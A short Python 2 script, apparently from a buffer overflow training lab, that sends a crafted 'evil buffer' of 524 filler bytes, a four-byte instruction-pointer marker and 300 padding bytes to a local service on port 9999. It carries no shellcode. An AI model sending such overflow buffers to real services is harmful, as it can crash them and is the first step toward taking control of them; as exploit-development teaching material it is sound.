#!/usr/bin/python
import socket

try:
 print "\nSending evil buffer..."
 
 filler = "A" * 524
 eip = "B" * 4
 buffer = "C" * 300
 
 inputBuffer = filler + eip + buffer
 
 
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("127.0.0.1", 9999))
 s.send(inputBuffer + '\r\n')
 print "\nDone!"
except:
 print "\nCould not connect!"
